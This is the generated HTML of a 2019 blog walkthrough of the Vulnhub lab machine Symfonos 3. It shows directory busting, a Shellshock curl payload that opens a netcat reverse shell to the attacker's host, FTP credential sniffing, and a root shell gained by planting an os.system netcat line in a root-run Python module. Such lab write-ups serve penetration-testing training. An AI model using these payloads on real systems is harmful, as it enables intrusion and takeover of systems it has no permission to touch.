@@ -1,0 +1,557 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>Vulnhub - Symfonos 3 &middot; Congo</title>
+    <meta name="title" content="Vulnhub - Symfonos 3 &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        This is a walkthrough of Symfonos 3 which is 3rd machine in Symfonos series.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/symfonos3-writeup/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/symfonos3-writeup/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="Vulnhub - Symfonos 3">
+  <meta property="og:description" content="This is a walkthrough of Symfonos 3 which is 3rd machine in Symfonos series.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2019-08-04T00:00:00+00:00">
+    <meta property="article:modified_time" content="2019-08-04T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="Vulnhub - Symfonos 3">
+<meta name="twitter:description" content="This is a walkthrough of Symfonos 3 which is 3rd machine in Symfonos series.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "Vulnhub - Symfonos 3",
+    "headline": "Vulnhub - Symfonos 3",
+    
+    "abstract": "This is a walkthrough of Symfonos 3 which is 3rd machine in Symfonos series.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/symfonos3-writeup\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2019",
+    "dateCreated": "2019-08-04T00:00:00\u002b00:00",
+    "datePublished": "2019-08-04T00:00:00\u002b00:00",
+    
+    "dateModified": "2019-08-04T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "863"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Vulnhub - Symfonos 3
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2019-08-04 00:00:00 &#43;0000 UTC">4 August 2019</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>This is a walkthrough of Symfonos 3 which is 3rd machine in Symfonos series.</p>
+<!-- more -->
+<h1 id="nmap" class="relative group">Nmap <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#nmap" aria-label="Anchor">#</a></span></h1><p>Let&rsquo;s scan the network and start working on the machine right away. Using <code>nmap -sV -sC -A -p- -T5 192.168.43.22</code> shows that we have FTP, SSH and HTTP.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/symfonos3/nmap.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h1 id="http-enumeration" class="relative group">HTTP Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#http-enumeration" aria-label="Anchor">#</a></span></h1><p>This was kind of time consuming since it involves lots of nested directory busting, I mostly use gobutser so with some bash scripting I automated the scan by updating the script with every finding.
+My strategy for that was to copy every dictionary/wordlists into a single directory and using the bash we used it to find the directories. I used <strong>dirbuster</strong> and <strong>dirb</strong> wordlists only.</p>
+<pre tabindex="0"><code>#!/bin/sh
+for i in $(pwd)/*.txt; do
+    gobuster dir -u http://192.168.43.22 -w &#34;$i&#34; | grep Status: 
+done
+</code></pre><p>First, I found <code>gate</code>, then <code>cerberus</code> after that <code>tartarus</code>. After that I tried again with the script this time we got more than 4 hits:-</p>
+<pre tabindex="0"><code>=============================================================== 
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.43.22/gate/cerberus/tartarus/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2019/08/04 01:28:56 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/charon (Status: 301)
+/hermes (Status: 301)
+/research (Status: 200)
+===============================================================
+</code></pre><p>But somehow <code>research</code> was a rabbit hole, perhaps a wild goose chase for us. Then, I tried again with <code>cgi-bin</code> from previous findings. Now directory busting to the <code>http://192.168.43.22/cgi-bin</code>, I found a hit at <code>underworld</code>. PS: In case you don&rsquo;t know about greek mythology, underworld is home of the god <strong>Hades</strong>.</p>
+<pre tabindex="0"><code>#!/bin/sh
+for i in $(pwd)/*.txt; do
+    gobuster dir -u http://192.168.43.22/cgi-bin -w &#34;$i&#34; | grep Status: 
+done
+</code></pre><hr>
+<p>root@kali:/usr/share/wordlists/dirb# ./new.sh
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/.hta (Status: 403)
+/underworld (Status: 200)</p>
+<hr>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/symfonos3/underworld.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+
+There, we got the <code>underworld</code>, the real game begins from here.</p>
+<h1 id="reverse-shell-and-ftp-network-sniffing" class="relative group">Reverse Shell and FTP Network Sniffing <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reverse-shell-and-ftp-network-sniffing" aria-label="Anchor">#</a></span></h1><p>From that page we can see that it&rsquo;s saying <code>uptime</code>, I tried to enumerate more but somehow none worked. I switched to some research on similar machines to get information about this thinking that it might have been some kind of task of a machine.
+From that I found a machine from PentesterLab which has <strong>kind of</strong> vulnerability but after checking it I was confirmed that it was same. The vulnerability is named <strong>ShellShock</strong>. In this type of vulnerablity you have the pass the bash command as a User-Agent for that particular request. So, using the following command with the help of curl, we get a reverse shell on our host machine.</p>
+<pre tabindex="0"><code>robin@oracle:~$ curl -A &#34;() { :; }; /bin/bash -c &#39;nc 192.168.43.243 1337 -e /bin/sh&#39;&#34; http://192.168.43.22/cgi-bin/underworld
+</code></pre><p>Once, we get reverse shell I found out we have privilge of cerberus, so from some basc enumeration I didn&rsquo;t found anything so I thought of using the <code>pspy</code> script which is useful for tracing the background proccesses. Using <code>pspy</code>  after using wget to grab it from server I found out there is a ftp server is running in the background. I thought of checking the directory too but permission denied.
+Now, I started grabbing the network dump using tcpdump since it ws available for usage, using <code>tcpdump -w ftplog.pcap -i lo</code>, the FTP server was runiing on the <code>lo</code> interface because the other one has our reverse shell connected to using shellshock. SInce, I first grabbed the <code>en0ps17</code> but I saw that our curl is making request to server.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/symfonos3/pspy.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<blockquote>
+<p>Warning: Let the tcpdump run for 5-10 minutes so you can grab enough data to analyse.</p>
+</blockquote>
+<p>I saved the file in <code>/tmp</code> folder and started a HTTP server using python <code>python -m SimpleHTTPServer 1234</code> and grabbed the <code>ftplog.pcap</code> right away from <code>http://192.168.43.22:1234</code>.</p>
+<p>After opening it in wireshark and filtering out the packets for FTP only with <code>tcp.port == 21</code>, I got some packets with FTP service and following TCP Stream of that packet I found the user <code>hades</code> password.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/symfonos3/hades.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h1 id="root" class="relative group">Root <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#root" aria-label="Anchor">#</a></span></h1><p>Once you SSH into the system as user <strong>hades</strong> with the above password you&rsquo;ll find out that we have the same thing as user cerberus. So, the last option was to run the <code>pspy</code> again, doing that so I found that we have nothing more nothing less than previous scan. I started trying again in ftpclient, this time we can access the folder which has a python script which is running the server by the <strong>root</strong> itself. So, there is <strong>more to see than meets the eye</strong>.</p>
+<p>After analysing the script I found that script is using a module named <code>ftplib.py</code> in <code>/opt/ftpclient</code> which is running as root, as from my previous experience I thought that we need to edit the module file itself to get root privilges or anything to get moving. I checked permission and it turns out we can edit it since the user <code>hades</code> ia belong to group <code>gods</code>.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/symfonos3/ftpclient.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Now, I added a line <code>os.system(&quot;nc 192.168.43.243 4444 -e /bin/bash)</code> in the file so that once the script will be run our reverse shell gets executed giving a root shell. So, once done I started my listener and start analysing the process again, once that script runs we have the shell as <strong>root</strong>.
+Hence, the flag.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/symfomos3/root.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Thanks to <a href="https://twitter.com/zayotic" target="_blank" rel="noreferrer">@zayotic</a> for making this wonderful machine.</p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/dpwwn/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Vulnhub - dpwnn1</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2019-08-01 00:00:00 &#43;0000 UTC">1 August 2019</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/troll1/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Vulnhub - Tr0ll:1</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2019-08-24 00:00:00 &#43;0000 UTC">24 August 2019</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
